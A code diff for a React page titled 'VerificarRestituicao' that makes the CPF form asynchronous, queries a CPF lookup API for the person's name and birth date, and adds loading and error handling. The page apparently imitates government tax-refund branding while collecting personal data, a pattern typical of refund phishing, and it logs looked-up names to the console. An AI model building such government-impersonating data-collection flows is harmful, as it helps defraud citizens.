@@ -96,7 +96,7 @@ export default function VerificarRestituicao() {
     return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
   };
 
-  const onSubmit = (data: CpfFormType) => {
+  const onSubmit = async (data: CpfFormType) => {
     // Verificar se a imagem foi selecionada corretamente
     if (!imageVerified) {
       toast({
@@ -109,9 +109,9 @@ export default function VerificarRestituicao() {
     
     // Limpar mensagens de erro anteriores
     setErrorMessage("");
+    setShowLoading(true);
     
     const cpfLimpo = data.cpf.replace(/\D/g, "");
-    setCpfConsultado(cpfLimpo);
     
     // Limpar dados anteriores
     clearUserData();
@@ -121,8 +121,45 @@ export default function VerificarRestituicao() {
       cpf: cpfLimpo
     });
     
-    // Ir para a página de confirmação de identidade sem passar o CPF na URL
-    navigate('/confirmar-identidade');
+    try {
+      // Consultar o CPF diretamente aqui em vez de usar o estado
+      const response = await fetch(`/api/consulta-cpf?cpf=${cpfLimpo}`);
+      
+      if (!response.ok) {
+        const errorData = await response.json().catch(() => ({}));
+        throw new Error(errorData.error || "Erro ao consultar CPF");
+      }
+      
+      const dadosCpf = await response.json();
+      
+      // Verificar se os dados estão completos
+      if (!dadosCpf.Result || !dadosCpf.Result.NomePessoaFisica || !dadosCpf.Result.DataNascimento) {
+        throw new Error("Dados incompletos retornados pela API");
+      }
+      
+      console.log("Dados do CPF obtidos com sucesso:", dadosCpf.Result.NomePessoaFisica);
+      
+      // Atualizar estado de consulta (para manter compatibilidade)
+      setCpfConsultado(cpfLimpo);
+      
+      // Agora que temos os dados, podemos navegar para a página de confirmação
+      navigate('/confirmar-identidade');
+    } catch (error) {
+      console.error("Erro ao consultar CPF:", error);
+      const errorMsg = error instanceof Error 
+        ? error.message 
+        : "Não foi possível consultar o CPF no momento. Tente novamente mais tarde.";
+        
+      setErrorMessage(errorMsg);
+      
+      toast({
+        title: "Erro na consulta",
+        description: errorMsg,
+        variant: "destructive"
+      });
+    } finally {
+      setShowLoading(false);
+    }
   };
 
   const { toast } = useToast();
@@ -240,20 +277,20 @@ export default function VerificarRestituicao() {
                         <Button 
                           type="submit" 
                           className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex items-center justify-center w-full py-3"
-                          disabled={isLoading || !imageVerified}
+                          disabled={isLoading || showLoading || !imageVerified}
                         >
                           <i className="fas fa-arrow-right mr-2"></i>
-                          <span>{isLoading ? "Consultando..." : "Prosseguir"}</span>
+                          <span>{showLoading ? "Consultando..." : "Prosseguir"}</span>
                         </Button>
                       </div>
                       
-                      {isError && (
+                      {errorMessage && (
                         <div className="text-red-600 text-center mt-4 p-3 bg-red-50 rounded-md">
                           {errorMessage || "Não foi possível verificar o CPF. Por favor, tente novamente."}
                         </div>
                       )}
                       
-                      {isLoading && (
+                      {(isLoading || showLoading) && (
                         <div className="text-blue-600 text-center mt-4 p-3 bg-blue-50 rounded-md">
                           Consultando informações do CPF. Por favor, aguarde...
                         </div>
